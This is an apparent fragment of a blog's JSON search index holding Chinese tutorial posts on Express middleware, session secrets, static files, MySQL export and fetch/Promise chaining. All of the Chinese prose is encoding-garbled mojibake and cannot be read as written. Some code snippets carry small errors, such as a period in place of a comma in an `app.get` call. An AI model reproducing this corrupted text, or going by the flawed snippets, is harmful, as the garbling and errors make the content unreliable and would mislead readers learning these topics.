åŒ¯å‡ºè³‡æ–™åº«çš„æ–¹å¼","text":"è¦æ³¨æ„ä¸€ä¸‹ã€‚ ç°¡è¿°å…ˆé»ä½ è¦åŒ¯å‡ºçš„ databaseï¼Œç„¶å¾ŒæŒ‰åŒ¯å‡ºï¼š è¦æ³¨æ„å¦‚æœæ˜¯åŒ¯å‡º database çš„è©±ï¼Œé€™ä¸€æ­¥ä¸€å®šè¦é¸ã€Œè‡ªè¨‚ã€ï¼Œç„¶å¾ŒæŠŠã€ŒåŠ å…¥ CREATE DATABASE / USE æŒ‡ä»¤ã€å‹¾èµ·ä¾†ï¼š ç‚ºä»€éº¼ä¸€å®šè¦å‹¾ï¼Ÿå› ç‚ºæ²’æœ‰å‹¾çš„è©±åœ¨åŒ¯å…¥æ™‚å°±æ²’æœ‰ CREATE DATABASE æŒ‡ä»¤èƒ½ç”¨ï¼Œç„¶å¾Œå°±æœƒå‡ºéŒ¯äº†ã€‚ å¯«é€™ç¯‡ä¸»è¦æ˜¯æƒ³æé†’é€™é»è€Œå·²ã€‚è‡³æ–¼åŒ¯å…¥çš„è©±ï¼Œå°±æ˜¯å…ˆé»ã€ŒåŒ¯å…¥ã€æŒ‰éˆ•ï¼Œåœ¨æŠŠæª”æ¡ˆä¸Šå‚³è€Œå·²ï¼Œé€™é‚Šå°±ä¸è²¼äº†ã€‚","link":"/2022/03/08/export-mysql-database/"},{"title":"Express å’Œ Apache çš„å·®åˆ¥","text":"åœ¨å­¸æœƒä¹‹å‰é‚„è »å¥½å¥‡çš„ã€‚ ç°¡è¿°åœ¨ Apache çš„æµç¨‹æ˜¯é•·é€™æ¨£ï¼š åœ¨ Express çš„æµç¨‹æ˜¯é•·é€™æ¨£ï¼š é¦–å…ˆæœ€å¤§çš„å·®åˆ¥æ˜¯ Express å…·å‚™ã€Œè·¯ç”±ã€çš„èƒ½åŠ› 12345app.get('/', ...)app.post('/', ...)app.delete('/', ...)app.patch('/', ...)... è€Œ PHP + Apache çš„ç‰¹æ€§å¾ˆæ˜é¡¯ï¼Œå°±æ˜¯é è¨­åªæœƒç”±ã€Œæª”æ¡ˆè·¯å¾‘ã€ä¾†å›æ‡‰ resposneã€‚ 123è«‹æ±‚ http://localhost/hello.phpApache å« PHP å»åŸ·è¡Œ hello.phpApache å†æŠŠåŸ·è¡Œçµæœå‚³å›å» ç°¡å–®ä¾†èªªå°±æ˜¯ä¸€ç¨®ã€Œæª”æ¡ˆç³»çµ±ã€çš„æ„Ÿè¦ºï¼Œä½ åˆ°æ‰“é–‹ä»€éº¼æª”æ¡ˆå°±å›å‚³ä»€éº¼ã€‚ ä½† Express æ²’æœ‰é€™ç¨®æ±è¥¿ï¼Œå¯ä»¥æƒ³æˆå®ƒæœ¬èº«å°±å…·å‚™ç”¢ç”Ÿçµæœçš„èƒ½åŠ›ï¼Œä¸ç”¨å†é€éã€Œ PHP åŸ·è¡Œæª”æ¡ˆã€ã€‚ ç¸½ä¹‹ï¼Œä½ ä¸æœƒåœ¨ Express çœ‹åˆ°é€™ç¨®æ±è¥¿ï¼š 1234app.get('/hello.js', ...)app.post('/bye.js', ...)app.delete('/index.js', ...)app.patch('/about.js', ...) æˆ‘æƒ³è¦ä»€éº¼è·¯ç”±ç›´æ¥å¯«å°±å¥½ï¼Œä¹Ÿä¸ç”¨å†é–‹ä¸€å¤§å †æª”æ¡ˆä¾†è™•ç†æ¯å€‹ requestï¼Œé€™å°±æ˜¯ Express çš„å¼·å¤§ä¹‹è™•ã€‚ ç¸½çµä¾†èªªï¼ŒExpress å°±æ˜¯ä¸€å€‹èƒ½æ ¹æ“šã€Œè·¯å¾‘ã€å’Œã€ŒHTTP Methodã€æ±ºå®šè¦å›å‚³ä»€éº¼å…§å®¹çš„ Serverã€‚ ä¸éç‚ºä»€éº¼ Express å¯ä»¥åšåˆ°é€™ä»¶äº‹ï¼Ÿæ˜¯å› ç‚ºæœ‰å€‹å«åšã€ŒMiddlewareã€çš„æ±è¥¿ï¼Œé€™å€‹ä¹‹å¾Œæœƒåœ¨è§£é‡‹ã€‚","link":"/2022/03/25/express-and-apache-difference/"},{"title":"èªè­˜ Express ä¸­çš„ Middleware","text":"Express çš„æœ¬é«”ã€‚ ä»€éº¼æ˜¯ Middlewareå…ˆä¾†çœ‹ä¸€å¼µåœ–ï¼š ç°¡å–®ä¾†èªªï¼ŒMiddleware å°±æ˜¯æ”¶åˆ° request å¾Œè¦åšä»€éº¼è™•ç†çš„ functionã€‚ æ‰€ä»¥ä½ ä»”ç´°çœ‹å°±æœƒç™¼ç¾ Express å°±æ˜¯å„ç¨® Middleware ä¾†çµ„æˆçš„ï¼š 1234567891011121314151617181920212223242526272829303132/* app.use ä»£è¡¨ä¸€é–‹å§‹å°±æœƒå…ˆåŸ·è¡Œçš„å…¨åŸŸ Middlewareï¼š bodyParser: è§£æ request body session: å»ºç«‹ session æ©Ÿåˆ¶ connect-flash: ä¸€é–ƒè€Œéçš„è¨Šæ¯*/app.use(express.urlencoded({ extended: true }));app.use(express.json());app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))app.use(flash());// è‡ªè¨‚çš„ Middlewareï¼Œç”¨ä¾†å„²å­˜çµ¦ view å­˜å–çš„è®Šæ•¸app.use((req, res, next) =&gt; { res.locals.username = req.session.username; res.locals.errorMessage = req.flash('errorMessage'); next();})// è‡ªè¨‚çš„ Middlewareï¼Œç”¨ä¾†å›åˆ°ä¸Šä¸€é const toPreviousPage = (req, res) =&gt; { return res.redirect('back');}// æ ¹æ“šè·¯ç”±æ”¶åˆ°çš„ requestï¼Œä¾åºä¸Ÿçµ¦ middleware1, middleware2... ä¾†è™•ç†ï¼Œä»¥æ­¤é¡æ¨app.get('/login', usersController.login);app.post('/login', usersController.handleLogin, toPreviousPage);app.get('/logout', usersController.logout);app.get('/register', usersController.register);app.post('/register', usersController.handleRegister, toPreviousPage); åªè¦æ˜¯ Middleware éƒ½æœƒæœ‰ä¸‰å€‹åƒæ•¸ï¼šreqã€res å’Œ next 12345function middleware (req, res, next) { // åœ¨é€™è£¡é¢å°±å¯ä»¥ç”¨ req, res åšä»»ä½•äº‹ // æ¥è‘—å†å‘¼å« next()ï¼ŒæŠŠæ§åˆ¶æ¬Šäº¤çµ¦ä¸‹å€‹ middleware next()} å¯¦éš›ç¯„ä¾‹å…ˆä¾†ä»‹ç´¹ app.useï¼Œå¯ä»¥æƒ³æˆæ˜¯ã€Œå…¨åŸŸçš„ Middlewareã€ï¼Œå®ƒæœƒå½±éŸ¿åˆ°æ‰€æœ‰è·¯ç”±ï¼š 123456app.use((req, res, next) =&gt; { console.log('now: ', new Date()); // åœ¨ console é¡¯ç¤ºç›®å‰æ™‚é–“ next(); // äº¤çµ¦ä¸‹å€‹ middlewareï¼Œé€™é‚Šçš„ä¸‹ä¸€å€‹æ˜¯ todoController});app.get('/todos', todoController.getAll)app.get('/todos/:id', todoController.get) æ‰€ä»¥åªè¦ä¸ç®¡æˆ‘åˆ° /todos æˆ– /todos/:idï¼Œconsole è£¡éƒ½æœƒé¡¯ç¤ºç›®å‰æ™‚é–“ï¼Œå› ç‚ºå®ƒçš„é †åºæ˜¯é€™æ¨£çš„ï¼š é¡¯ç¤ºæ™‚é–“çš„ Middleware &gt; é¡¯ç¤º todo çš„ Middlewareï¼ˆtodoContollerï¼‰ ä½†æœ‰äº›æ™‚å€™æˆ‘å€‘å¯èƒ½åªæƒ³æŠŠ Middleware ç¶åœ¨ç‰¹å®šçš„è·¯ç”±ä¸Šï¼Œé€™æ™‚å€™å°±å¯ä»¥é€™æ¨£å¯«ï¼š 12345678function localMiddleware (req, res, next) { console.log('now: ', new Date()); next();}// åªç¶åœ¨é€™è£¡ï¼Œç•¶ localMiddleware åŸ·è¡Œ next å¾Œæ‰æœƒä¸Ÿçµ¦ todoControllerapp.get('/todos', localMiddleware, todoController.getAll)// é€™è£¡ä¸æœƒå¥—ç”¨app.get('/todos/:id', todoController.get) ç‚ºä»€éº¼éœ€è¦ Middlewareå‰é¢ä»‹ç´¹äº†é€™éº¼å¤šï¼Œé‚„æ²’è¬›åˆ°ä¸€å€‹é‡é»ï¼Œç‚ºä»€éº¼éœ€è¦ Middlewareï¼Ÿ ä¾†èˆ‰å€‹ä¾‹å­ï¼Œå¦‚æœæˆ‘æƒ³è¦å–å¾— request body çš„å…§å®¹çš„è©±æ€éº¼è¾¦ï¼Ÿä½ å¯èƒ½å¾ˆç›´è¦ºçš„é€™æ¨£å¯«ï¼š ï¼ˆå‡è¨­æ˜¯ä¸€å€‹æ–°å¢ todo çš„ requestï¼‰ 123app.post('/todos', (req, res) =&gt; { console.log(req.body);}) é€™æ¨£çš„æƒ³æ³•æ˜¯æ­£ç¢ºçš„ã€‚ä½†å¾ˆæŠ±æ­‰ï¼ŒExpress é è¨­çš„ Middleware æ˜¯æ²’æœ‰æä¾›é€™å€‹åŠŸèƒ½çš„ï¼Œä½ å¿…é ˆé€éå¦å¤–ä¸€å€‹ Middlewareï¼Œè®“å®ƒå…ˆè™•ç†å¥½ request body çš„éƒ¨åˆ†å¾Œï¼Œæ‰å‚³çµ¦ä½ ç¾åœ¨çš„ Middlewareï¼Œå¤§æ¦‚æœƒé•·é€™æ¨£ï¼š 123456// å¼•å…¥åˆ¥äººå¯«å¥½çš„ middlewareconst bodyParser = require('body-parser');// è§£æ Form è¡¨å–®ï¼ˆapplication/x-www-form-urlencodedï¼‰app.use(bodyParser.urlencoded({ extended: true }));// è§£æ JSONapp.use(bodyParser.json()); å‰›æœ‰èªªé app.use æœƒæ˜¯è¢«è¦–ç‚ºå…¨åŸŸçš„ Middlewareï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†åœ¨å…¶ä»–çš„ Middleware è£¡é¢éƒ½å¯ä»¥ç›´æ¥ç”¨ req.body.key ä¾†æ‹¿å…§å®¹ã€‚ å‰›å‰›æ˜¯é¨™ä½ çš„ï¼Œå…¶å¯¦åœ¨ 4.0 ä»¥å¾Œ Express æœ‰æä¾›å…§å»ºçš„ Middlewareï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨ä¸‹è¼‰ body-parserï¼š 123// æ”¹æˆ express.urlencoded å’Œ express.jsonapp.use(express.urlencoded({ extended: true }));app.use(express.json()); é †é“ä¸€æï¼ŒExpress å…§å»ºçš„ middleware æœ‰æä¾›å–å¾— query string çš„åŠŸèƒ½ï¼š 123app.get('/'. (req, res, next) =&gt; { console.log(req.query); // {key: value}}) å…¶ä»–æ³¨æ„äº‹é … res.end å¾Œä¸å¯ä»¥å†å‘¼å« next()ï¼Œå› ç‚º response å·²ç¶“é€å‡ºå»äº†ã€‚ INSERT æŒ‡ä»¤æœƒæ‹¿åˆ°çš„ resultï¼š 12345678910result: OkPacket { fieldCount: 0, affectedRows: 1, insertId: 4, serverStatus: 2, warningCount: 0, message: '', protocol41: true, changedRows: 0} è³‡è¨Šè »å¤šçš„ï¼Œä½†æœ€å¸¸ç”¨çš„æ‡‰è©²æœƒæ˜¯ affectedRows å’Œ insertIdã€‚ ejs æœ‰åˆ† = å’Œ - çš„å·®åˆ¥ = æœƒè‡ªå‹•åšæ–‡å­—è·³è„«ï¼Œ- ä¸æœƒã€‚ 12&lt;%= '&lt;h1&gt;safe&lt;/h1&gt;' %&gt;&lt;%- '&lt;h1&gt;unsafe&lt;/h1&gt;' %&gt; é—œæ–¼ flash å’Œ session è«‹å‹™å¿…è¨˜å¾—é€™å€‹é †åºï¼š 12345678910const flash = require('connect-flash');const session = require('express-session');// session å…ˆapp.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))// æ¥è‘—æ‰å¯ä»¥ç”¨ flashapp.use(flash());","link":"/2022/03/25/express-middleware/"},{"title":"ä½¿ç”¨ Express æ™‚çš„æ³¨æ„äº‹é …ï¼Œé‚„æœ‰ä¸€äº›åœ°é›·","text":"çœŸçš„è¦æ³¨æ„å•¦ã€‚ next çš„å‘¼å«æ™‚æ©Ÿres.end å¾Œä¸å¯ä»¥å†å‘¼å« next()ï¼Œå› ç‚º response å·²ç¶“é€å‡ºå»äº†ã€‚ ç”¨ INSERT æŒ‡ä»¤æœƒæ‹¿åˆ°çš„ resultï¼š12345678910result: OkPacket { fieldCount: 0, affectedRows: 1, insertId: 4, serverStatus: 2, warningCount: 0, message: '', protocol41: true, changedRows: 0} è³‡è¨Šè »å¤šçš„ï¼Œä½†æœ€å¸¸ç”¨çš„æ‡‰è©²æœƒæ˜¯ affectedRows å’Œ insertIdã€‚ ejs æœ‰åˆ† = å’Œ - çš„å·®åˆ¥= æœƒè‡ªå‹•åšæ–‡å­—è·³è„«ï¼Œ- ä¸æœƒã€‚ 12&lt;%= '&lt;h1&gt;safe&lt;/h1&gt;' %&gt;&lt;%- '&lt;h1&gt;unsafe&lt;/h1&gt;' %&gt; é—œæ–¼ flash å’Œ sessionè«‹å‹™å¿…è¨˜å¾—é€™å€‹é †åºï¼š 12345678910const flash = require('connect-flash');const session = require('express-session');// session å…ˆapp.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))// æ¥è‘—æ‰å¯ä»¥ç”¨ flashapp.use(flash()); ä¹Ÿä¸è¦ç‚ºäº†æ¸¬è©¦è€Œé€™æ¨£å¯«ï¼š 123456789handleLogin: (req, res, next) =&gt; { const { username, password } = req.body; if (!username || !password) { req.flash('errorMessage', 'è«‹å¡«æ»¿æ‰€æœ‰æ¬„ä½å“¦ï¼'); // é€™é‚ŠæœƒæŠŠå€¼è¦†å¯«æ‰ï¼Œæ‰€ä»¥ä½ æ€éº¼è®€éƒ½è®€ä¸åˆ°ã€‚ console.log(req.flash('errorMessage')); return next(); }}","link":"/2022/03/25/express-notice/"},{"title":"é—œæ–¼ Express ä¸­çš„ session-secret","text":"æ€éº¼éƒ½æ²’æœ‰äººé–‹é–€è¦‹å±±èªªä¸€ä¸‹é€™æ˜¯å•¥ã€‚ ç°¡è¿°è‡ªå¾å­¸ Express å°±ä¸€ç›´å¥½å¥‡é€™æ®µ code çš„æ„æ€ï¼š 12345app.use(session({ secret: 'keyboard cat', // &lt;- é€™åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿ resave: false, saveUninitialized: true,})) ç¶²è·¯ä¸Šæ‰¾äº†å¾ˆå¤šæ–‡ç« éƒ½åªå¯«ä¸€äº›åƒæ˜¯ï¼š ç”¨ä¾†èªè­‰è©² Session çš„è³‡æ–™ ç”¨äºç”Ÿæˆ session çš„å®‰å…¨å­—ç¬¦ä¸² ç”¨äºåŠ å¯†ç›®æ ‡æ•°æ®ç”¨çš„å­—ç¬¦ä¸² å¥½ï¼Œèƒ½çœ‹å‡ºå®ƒè·ŸåŠ å¯†çš„æ±è¥¿ä¼¼ä¹æœ‰é»é—œä¿‚ï¼Œä½†å¥½åƒé‚„æ˜¯å¾ˆæŠ½è±¡ï¼Ÿ å¥½åœ¨ Huli å¯«çš„ æ·±å…¥ Session èˆ‡ Cookieï¼šExpressã€PHP èˆ‡ Rails çš„å¯¦ä½œ æœ‰æåˆ° Express æ˜¯æ€éº¼å¯¦ä½œ session çš„ï¼Œé€™é‚Šç¯€éŒ„å¹¾å€‹æ®µè½ï¼š é‚£é€™å€‹ sessionID æ˜¯ä»¥ä»€éº¼æ¨£çš„å½¢å¼å­˜é€² Cookie çš„å‘¢ï¼Ÿ 12345678910111213141516171819202122232425262728293031var cookie = require('cookie')var signature = require('cookie-signature')// get the session cookie namevar name = opts.name || opts.key || 'connect.sid'// get the cookie signing secretvar secret = opts.secretif (secret &amp;&amp; !Array.isArray(secret)) { secret = [secret];}// set-cookieonHeaders(res, function(){ // set cookie setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data);});function setcookie(res, name, val, secret, options) { var signed = 's:' + signature.sign(val, secret); var data = cookie.serialize(name, signed, options); debug('set-cookie %s', data); var prev = res.getHeader('Set-Cookie') || [] var header = Array.isArray(prev) ? prev.concat(data) : [prev, data]; res.setHeader('Set-Cookie', header)} å…§å®¹çš„éƒ¨åˆ†æ¯”è¼ƒç‰¹åˆ¥ä¸€é»ï¼Œæœƒä»¥ s: é–‹é ­ï¼Œå¾Œé¢æ¥ä¸Š signature.sign(sessionID, secret) çš„çµæœã€‚ æŠŠé‡é»æ”¾åœ¨ function setcookie(res, name, val, secret, options) { ... }ï¼Œå…¶å¯¦ç­”æ¡ˆå°±å‡ºä¾†äº†ã€‚ ç°¡å–®ä¾†èªª cookie æœ€å¾Œçš„å€¼æœƒæ˜¯ s:åŠ ä¸Š signature.sign(val, secret) ç”¢ç”Ÿçš„ä¸€æ®µå­—ä¸²ï¼ˆä¹Ÿå°±æ˜¯æ‰€è¬‚çš„é‘‘åˆ¥ç¢¼ï¼‰ã€‚å¾é€™è£¡èƒ½çœ‹åˆ° secret æœƒè¢«ä¸Ÿåˆ° function è£¡é¢åšäº†æŸäº›äº‹ä»¥å¾Œç”¢ç”Ÿä¸€å€‹é‘‘åˆ¥ç¢¼ï¼Œæ—¢ç„¶å¦‚æ­¤ secret çš„ç”¨é€”å°±å¾ˆç›´ç™½äº†ã€‚ secret å°±æ˜¯ç”¢ç”Ÿé‘‘åˆ¥ç¢¼æ™‚æœƒä¸€èµ·æ”¾é€²å»çš„è‡ªå®šç¾©å­—ä¸²ï¼ˆæˆ–æƒ³æˆæ˜¯é›œæ¹Šå‰è¦å…ˆåŠ é¹½çš„æ¦‚å¿µï¼‰ å°±æ˜¯é€™éº¼ç°¡å–®ã€‚ æ‰€ä»¥å¾ˆå¤šäººè¦ä½ ç”¨ã€Œç’°å¢ƒè®Šæ•¸ã€ä¾†è¨­å®š secret å°±æ˜¯é€™å€‹åŸå› ã€‚","link":"/2022/04/03/express-session-secret/"},{"title":"Express è¨­å®šéœæ…‹æª”æ¡ˆçš„æ–¹å¼","text":"ä¸€é»ä¹Ÿä¸å¥½ç©çš„è·¯å¾‘éŠæˆ²ã€‚ æ‡¶äººåŒ…æœ€å¸¸è¦‹çš„ç”¨æ³•å°±é€™å…©å€‹ï¼š 123// å…©å€‹çš„æ„æ€æ˜¯ä¸€æ¨£çš„ï¼Œä½† path çš„ç”¨æ³•è¦è¨˜å¾—å…ˆå¼•å…¥æ¨¡çµ„app.use(express.static(__dirname + '/public'));app.use(express.static(path.join(__dirname, 'public'))) è‡³æ–¼é€™åˆ°åº•æ˜¯ä»€éº¼æ„æ€ï¼Ÿæƒ³çŸ¥é“çš„è©±å°±çœ‹ä¸‹å»ã€‚ ç”¨é€”è§£é‡‹ç°¡å–®ä¾†èªªï¼Œexpress.static æ˜¯ç”¨ä¾†è¨­å®šã€Œéœæ…‹æª”æ¡ˆçš„ä½ç½®ã€ï¼š 1express.static(root, [options]) ç•¶æˆ‘è¨­å®š express.static(__dirname + '/public') çš„æ„æ€æ˜¯èªªï¼Œç•¶ç¶²å€æ˜¯ /hello æ™‚ï¼Œå°±å» /hello/public åº•ä¸‹å»æ‰¾ï¼›å¦‚æœæ˜¯ /hello/abcï¼Œå°±åˆ° /hello/abc/publicï¼Œä»¥æ­¤é¡æ¨ã€‚ ä½†è¦ç‰¹åˆ¥æ³¨æ„åœ¨å¼•å…¥ CSS æ™‚è¦ç”¨çµ•å°è·¯å¾‘ï¼Œæ˜¯ /css/style.css ä¸æ˜¯ css/style.cssï¼Œå¾Œé¢ç”¨çš„æ˜¯ã€Œç›¸å°è·¯å¾‘ã€ï¼Œé€™æ¨£å°±æœƒæŠ“ä¸åˆ°æª”æ¡ˆï¼Œç¸½ä¹‹è¦åˆ†æ¸…æ¥šé€™å…©å€‹çš„å·®åˆ¥ã€‚ï¼ˆé‚„æ˜¯ä¸å¤ªæ‡‚çš„è©±å°±åƒè€ƒ é€™ç¯‡ï¼‰ ä¸éæœƒç™¼ç¾å¦ä¸€å€‹å•é¡Œï¼Œç•¶æƒ³åœ¨ç€è¦½å™¨è®€å–æ™‚ï¼Œä¸æ˜¯ç”¨ /public/css/style.css ä¾†å­˜å–ï¼Œè€Œæ˜¯ç”¨ /css/style.css çš„æ–¹å¼ã€‚ å¦‚æœå¸Œæœ›æŒ‡å®šä¸€å€‹è·¯å¾‘ï¼Œè¦é€™æ¨£è¨­å®šï¼š 1app.use('/static', express.static(__dirname + '/public')); é€™æ¨£å°±å¯ä»¥ç”¨ /static/css/style.css ä¾†å­˜å–ã€‚","link":"/2022/03/31/express-static/"},{"title":"å¾ fetch ä¾†èªè­˜ Promise","text":"Promise æœ€æ ¸å¿ƒçš„åœ°æ–¹å°±æ”¾åœ¨é€™ç¯‡äº†ã€‚ fetch å›å‚³çš„æ˜¯ä¸€å€‹ Promise1234const url = 'https://api.com';const res = fetch(url);// Promise ç‰©ä»¶console.log(res) é€™å°±è·Ÿ $('.btn') æœƒå›å‚³ jQuery ç‰©ä»¶ï¼Œnew Date() æœƒå›å‚³ Date ç‰©ä»¶ï¼Œ/yo/ æœƒå›å‚³ RegExp ç‰©ä»¶æ˜¯ä¸€æ¨£çš„é“ç†ã€‚fetch ä¹Ÿæœƒå›å‚³ä¸€å€‹ç‰©ä»¶ï¼Œé€™å€‹ç‰©ä»¶å°±å«åš Promiseã€‚ ä½†è¦æ³¨æ„ä¸¦ä¸æ˜¯åªæœ‰ fetch æ‰æœƒå›å‚³ Promiseï¼Œfetch åªæ˜¯å…¶ä¸­ä¹‹ä¸€è€Œå·²ã€‚ ä¾‹å¦‚ä»¥ä¸‹å›å‚³çš„ä¹Ÿæ˜¯ Promiseï¼š 1234// è®€å–å­˜åœ¨å‰ªè²¼ç°¿çš„å€¼ï¼ˆCtrl+Cï¼‰navigator.clipboard.readText().then(text =&gt; { console.log(text)}); æ€éº¼å¾ Promise ç‰©ä»¶æ‹¿åˆ°çµæœè¦ç”¨ Promise æä¾›çš„ .then æ–¹æ³•ä¾†å–å¾—ï¼Œè£¡é¢å‚³çš„æ˜¯ä¸€å€‹ callback functionï¼š 12345const url = 'https://api.com';fetch(url) .then(function (data) { console.log(data); }); çµæœå¤§æ¦‚é•·é€™æ¨£ï¼š 123456789Response { type: 'cors', url: 'https://run.mocky.io/v3/ec9680e0-f534-40a1-bbc4-5ef69fd61cc6', redirected: false, status: 200, ok: true, body: (...) bodyUsed: false headers: Headers {}} é€™æ™‚å€™å°±æœƒå¾ˆç–‘æƒ‘ã€Œå±…ç„¶æ²’è¾¦æ³•çœ‹åˆ° bodyï¼Ÿã€ï¼Œé€™æ˜¯å› ç‚ºå¾ then è£¡é¢æ‹¿åˆ°çš„æ±è¥¿ä¹Ÿæ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œæˆ‘ä¸ç¢ºå®šå®ƒå¯¦éš›ä¸Šå«åšä»€éº¼ï¼Œä½†ç¸½ä¹‹å…ˆå«å®ƒ Response å§ã€‚ å¦‚æœè¦çœ‹åˆ° body çš„å…§å®¹çš„è©±å¾—ç”¨ Response ç‰©ä»¶æä¾›çš„æ–¹æ³•ï¼Œæœ€å¸¸è¦‹çš„æœ‰å…©ç¨®ï¼š response.text() response.json() çµæœé€™æ¨£å¯«ä¹‹å¾Œåˆæœƒç™¼ç¾ï¼šã€Œé è…°ï¼Œæ€éº¼åˆæ˜¯ Promiseã€ 12345fetch(url) .then(function (response) { // Promise ç‰©ä»¶ console.log(response.text()); }); æ²’éŒ¯ï¼Œé€™å°±æ˜¯ Promise çš„å¥—è·¯ï¼Œé€šå¸¸åœ¨ Promise è£¡æœƒå†å›å‚³å¦ä¸€å€‹æ–°çš„ Promiseã€‚ ä½†æ˜¯ä¸ç”¨æƒ³å¤ªè¤‡é›œï¼Œé€™å€‹å°±è·Ÿ jQuery å¯ä»¥ä¸€ç›´ $(.btn).find('.aa').css() çš„é“ç†æœ‰é»åƒã€‚ç‚ºä»€éº¼å¯ä»¥ä¸€ç›´é€™æ¨£ . ä¸‹å»ï¼Ÿå› ç‚ºæ¯ä¸€æ¬¡çš„å›å‚³å€¼éƒ½æ˜¯ jQuery ç‰©ä»¶ã€‚ æ‰€ä»¥å¦‚æœè¦å†å¾ Promise è£¡é¢æ‹¿åˆ°çµæœï¼Œå°±è¦å†ç”¨ then ä¾†æ‹¿ï¼š 12345fetch(url) .then((response) =&gt; { // é€™é‚Šå°±çœŸçš„æ‹¿çš„åˆ° body äº† response.text().then(body =&gt; console.log(body)); }); ç‚ºä»€éº¼å¯ä»¥ then å†æ¥ thenå› ç‚º then é€™å€‹æ–¹æ³•å›å‚³çš„ä¹Ÿæ˜¯ä¸€å€‹ Promiseâ€¦ è€Œä¸”åœ¨ then è£¡é¢ã€Œå›å‚³çš„æ±è¥¿ã€æœƒæ˜¯ã€Œä¸‹ä¸€å€‹ then è£¡é¢æœƒæ‹¿åˆ°çš„å€¼ã€ã€‚é€™ä¸€æ®µå¾ˆé‡è¦ï¼Œæ‰€ä»¥éº»ç…©è¨˜èµ·ä¾†ï¼Œæ‹œè¨—æ‹œè¨—ã€‚ ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†ç¤ºç¯„ï¼š 12345678910111213141516171819fetch(api500) .then((response) =&gt; { response.json() .then(body =&gt; { console.log(body); // åœ¨é€™å›å‚³æ±è¥¿ return '123'; }) // é€™é‚Šå°±èƒ½æ‹¿åˆ°å‰›å‰›å›å‚³çš„æ±è¥¿ .then(fromFirst =&gt; { // 123 console.log(fromFirst); // é€™é‚Šä¸å›å‚³æ±è¥¿ }) .then(fromSecond =&gt; { // æ‹¿åˆ°é è¨­å›å‚³çš„ undefined console.log(fromSecond) }) }); å†ä¾†æ˜¯å¦å¤–ä¸€å€‹é‡é»ï¼Œå¦‚æœåœ¨ then è£¡å›å‚³çš„ä¹Ÿæ˜¯ Promiseï¼Œé‚£ä¸‹ä¸€å€‹ then æ‹¿åˆ°çš„æœƒæ˜¯Promise è§£æå¾Œï¼ˆåšå®Œ then å¾Œï¼‰çš„å€¼ ä¸€æ¨£ç¤ºç¯„ä¸€æ¬¡ï¼š 12345678910fetch(url) .then(response =&gt; { // response.json() =&gt; Promise return response.json(); }) .then(json =&gt; { // é€™è£¡æ‹¿åˆ°çš„å€¼ç­‰æ–¼ï¼š // response.json().then(json =&gt; json) console.log(json) }); é€™å€‹å°±æ˜¯ Promise æœ€å¤§çš„å„ªå‹¢äº†ï¼Œç‚ºä»€éº¼ï¼Ÿä½ æ¯”è¼ƒçœ‹çœ‹é€™å…©æ®µç¨‹å¼ç¢¼ï¼š 12345678910111213141516// ç¬¬ä¸€å€‹fetch(url) .then(response =&gt; { response.json() .then(json =&gt; { console.log(json); }); });// ç¬¬äºŒå€‹fetch(url) .then(response =&gt; { return response.json(); }) .then(json =&gt; { console.log(json); }) ç¬¬ä¸€å€‹å¯«æ³•æ ¹æœ¬å°±æ˜¯ callback hellï¼Œä½†ç¬¬äºŒå€‹å¯«æ³•å°±æ”¹å–„é€™å•é¡Œäº†ï¼Œå› ç‚ºå®ƒæŠŠå±¤æ•¸å£“ä½äº†ã€‚ å¯æ˜¯ç‚ºä»€éº¼èƒ½é€™æ¨£å­ï¼ŸåŸç†å°±æ˜¯å‰›å‰›è¬›çš„ï¼Œå¦‚æœåœ¨ then è£¡é¢å›å‚³ Promise çš„è©±ï¼Œä¸‹ä¸€å€‹ then å°±æœƒæ‹¿åˆ°è§£æå¾Œçš„çµæœã€‚ é€™é»é‚„è »æœ‰è¶£çš„ï¼Œç¶²è·¯ä¸Šç¢ºå¯¦åªæœƒæ•™ä½ ç¬¬äºŒç¨®å¯«æ³•ï¼Œä½†å¾ˆå°‘äººå‘Šè¨´éä½ ç‚ºä»€éº¼å¯ä»¥é€™æ¨£å­ã€‚ç¸½ä¹‹ï¼Œç›¸ä¿¡ç¾åœ¨ä½ æ‡‰è©²èƒ½ç†è§£äº†ã€‚ ä¾†åšå€‹ç¸½çµè¤‡ç¿’ä¸€ä¸‹ Promise çš„å¹¾å€‹ç‰¹æ€§ï¼š è¦æ‹¿åˆ° Promise çš„çµæœè¦ç”¨ then then æœ¬èº«æœƒå›å‚³ Promiseï¼Œæ‰€ä»¥å¯ä»¥ä¸€ç›´ then ä¸‹å» then è£¡é¢å›å‚³ä»€éº¼ï¼Œä¸‹å€‹ then å°±æœƒæ‹¿åˆ°ä»€éº¼ å¦‚æœ then è£¡å›å‚³çš„ä¹Ÿæ˜¯ Promiseï¼Œä¸‹å€‹ then æ‹¿åˆ°çš„å°±æœƒæ˜¯ Promise è§£æå¾Œçš„å€¼","link":"/2022/03/03/fetch-and-promise/"},{"title":"fetch è™•ç†éŒ¯èª¤çš„æ–¹å¼","text":"éŒ¯èª¤è™•ç†ä¹Ÿå¾ˆé‡è¦ã€‚ ç°¡è¿°ç•¶ axios ç”¨ç¿’æ…£äº†ä»¥å¾Œå†å›ä¾†ç¢° fetch æ™‚ï¼Œå¸¸å¸¸æœƒå¿˜è¨˜ fetch æœ¬èº«çš„ä¸€äº›æ€§è³ªï¼Œæ‰€ä»¥é€™ç¯‡æƒ³ç‰¹åˆ¥è¨˜éŒ„ä¸€ä¸‹ä½¿ç”¨ fetch æ™‚è¦æ³¨æ„çš„å¹¾ä»¶äº‹æƒ…ã€‚ å…ˆä¾†çœ‹ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼š 12345678const url400 = 'https://run.mocky.io/v3/20740358-1de6-4d0e-a62c-93ca279079ca'function example1() { fetch(url400) .then((response) =&gt; response.json()) .then((data) =&gt; console.log('success', data)) .catch((error) =&gt; console.log('error', error))} é™„è¨»ï¼šé€™é‚Šçš„ url400 æ˜¯ç”¨ mocky ä¾†ç”¢ç”Ÿçš„ï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥è‡ªå·±åˆ°ç¶²ç«™ä¸­å»ºç«‹ä¸€å€‹ API ä¾†æ¸¬è©¦ã€‚ 